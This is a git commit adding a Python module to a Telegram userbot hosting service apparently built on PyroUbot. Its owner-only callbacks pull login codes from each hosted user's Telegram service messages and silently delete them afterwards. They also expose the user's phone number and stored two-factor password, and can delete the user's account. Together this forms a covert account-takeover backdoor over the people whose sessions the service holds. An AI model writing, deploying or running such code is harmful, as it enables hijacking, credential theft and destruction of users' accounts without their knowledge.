50cb00e03d0ee81ad3577263cfc0328f5006fd8e
jamalasv2 <jamalasbanget@gmail.com>
2025-09-22 23:01:40 +0700

    Add files via upload

---
+++ Jamal/modules/toolsbot.py
@@ -0,0 +1,154 @@
+from PyroUbot.config import DEVS
+
+from PyroUbot.core.helpers import *
+from PyroUbot.core.database import *
+from PyroUbot import bot, ubot
+
+
+@PY.BOT("getubot")
+@PY.OWNER
+async def _(client, callback_query):
+    await bot.send_message(
+        callback_query.from_user.id,
+        await MSG.USERBOT(0),
+        reply_markup=InlineKeyboardMarkup(Button.userbot(ubot._ubot[0].me.id, 0)),
+    )
+
+
+@PY.CALLBACK("^(get_otp|get_phone|get_faktor|ub_deak|deak_akun)")
+async def _(client, callback_query):
+    user_id = callback_query.from_user.id
+    query = callback_query.data.split()
+    if not user_id == OWNER_ID:
+        return await callback_query.answer(
+            f"❌ ᴛᴏᴍʙᴏʟ ɪɴɪ ʙᴜᴋᴀɴ ᴜɴᴛᴜᴋ ᴍᴜ {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
+            True,
+        )
+    X = ubot._ubot[int(query[1])]
+    if query[0] == "get_otp":
+        async for otp in X.search_messages(777000, limit=1):
+            try:
+                if not otp.text:
+                    await callback_query.answer("❌ ᴋᴏᴅᴇ ᴏᴛᴘ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ")
+                else:
+                    await callback_query.edit_message_text(
+                        otp.text,
+                        reply_markup=InlineKeyboardMarkup(
+                            Button.userbot(X.me.id, int(query[1]))
+                        ),
+                    )
+                    await X.delete_messages(X.me.id, otp.id)
+            except Exception as error:
+                return await callback_query.answer(error)
+    elif query[0] == "get_phone":
+        try:
+            return await callback_query.edit_message_text(
+                f"<b>📲 ɴᴏᴍᴇʀ ᴛᴇʟᴇᴘᴏɴ ᴅᴇɴɢᴀɴ ᴜsᴇʀ_ɪᴅ <code>{X.me.id}</code> ᴀᴅᴀʟᴀʜ <code>{X.me.phone_number}</code></b>",
+                reply_markup=InlineKeyboardMarkup(
+                    Button.userbot(X.me.id, int(query[1]))
+                ),
+            )
+        except Exception as error:
+            return await callback_query.answer(error, True)
+    elif query[0] == "get_faktor":
+        code = await get_two_factor(X.me.id)
+        if code == None:
+            return await callback_query.answer(
+                "🔐 ᴋᴏᴅᴇ ᴛᴡᴏ-ғᴀᴄᴛᴏʀ ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ", True
+            )
+        else:
+            return await callback_query.edit_message_text(
+                f"<b>🔐 ᴛᴡᴏ-ғᴀᴄᴛᴏʀ ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ ᴅᴇɴɢᴀɴ ᴜsᴇʀ_ɪᴅ <code>{X.me.id}</code> ᴀᴅᴀʟᴀʜ <code>{code}</code></b>",
+                reply_markup=InlineKeyboardMarkup(
+                    Button.userbot(X.me.id, int(query[1]))
+                ),
+            )
+    elif query[0] == "ub_deak":
+        return await callback_query.edit_message_reply_markup(
+            reply_markup=InlineKeyboardMarkup(Button.deak(X.me.id, int(query[1])))
+        )
+    elif query[0] == "deak_akun":
+        ubot._ubot.remove(X)
+        await X.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
+        return await callback_query.edit_message_text(
+            MSG.DEAK(X),
+            reply_markup=InlineKeyboardMarkup(Button.userbot(X.me.id, int(query[1]))),
+        )
+
+
+@PY.CALLBACK("cek_masa_aktif")
+async def _(client, callback_query):
+    user_id = int(callback_query.data.split()[1])
+    expired = await get_expired_date(user_id)
+    try:
+        xxxx = (expired - datetime.now()).days
+        return await callback_query.answer(f"⏳ ᴛɪɴɢɢᴀʟ {xxxx} ʜᴀʀɪ ʟᴀɢɪ", True)
+    except:
+        return await callback_query.answer("✅ sᴜᴅᴀʜ ᴛɪᴅᴀᴋ ᴀᴋᴛɪғ", True)
+
+
+@PY.CALLBACK("del_ubot")
+async def _(client, callback_query):
+    user_id = callback_query.from_user.id
+    if not user_id == OWNER_ID:
+        return await callback_query.answer(
+            f"❌ ᴛᴏᴍʙᴏʟ ɪɴɪ ʙᴜᴋᴀɴ ᴜɴᴛᴜᴋ ᴍᴜ {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
+            True,
+        )
+    try:
+        show = await bot.get_users(callback_query.data.split()[1])
+        get_id = show.id
+        get_mention = f"{get_id}"
+    except Exception:
+        get_id = int(callback_query.data.split()[1])
+        get_mention = f"{get_id}"
+    for X in ubot._ubot:
+        if get_id == X.me.id:
+            await X.unblock_user(bot.me.username)
+            for chat in await get_chat(X.me.id):
+                await remove_chat(X.me.id, chat)
+            await rm_all(X.me.id)
+            await rem_pref(X.me.id)
+            await remove_all_vars(X.me.id)
+            await remove_ubot(X.me.id)
+            await rem_expired_date(X.me.id)
+            await remove_from_vars(bot.me.id, "PREM_USERS", X.me.id)
+            ubot._get_my_id.remove(X.me.id)
+            ubot._ubot.remove(X)
+            await X.log_out()
+            await callback_query.answer(
+                f"✅ {get_mention} ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs ᴅᴀʀɪ ᴅᴀᴛᴀʙᴀsᴇ", True
+            )
+            await callback_query.edit_message_text(
+                await MSG.USERBOT(0),
+                reply_markup=InlineKeyboardMarkup(
+                    Button.ambil_akun(ubot._ubot[0].me.id, 0)
+                ),
+            )
+            await bot.send_message(
+                X.me.id,
+                MSG.EXPIRED_MSG_BOT(X),
+                reply_markup=InlineKeyboardMarkup(Button.expired_button_bot()),
+            )
+
+    
+@PY.CALLBACK("^(p_ub|n_ub)")
+async def _(client, callback_query):
+    query = callback_query.data.split()
+    count = int(query[1])
+    if query[0] == "n_ub":
+        if count == len(ubot._ubot) - 1:
+            count = 0
+        else:
+            count += 1
+    elif query[0] == "p_ub":
+        if count == 0:
+            count = len(ubot._ubot) - 1
+        else:
+            count -= 1
+    await callback_query.edit_message_text(
+        await MSG.USERBOT(count),
+        reply_markup=InlineKeyboardMarkup(
+            Button.userbot(ubot._ubot[count].me.id, count)
+        ),
+    )
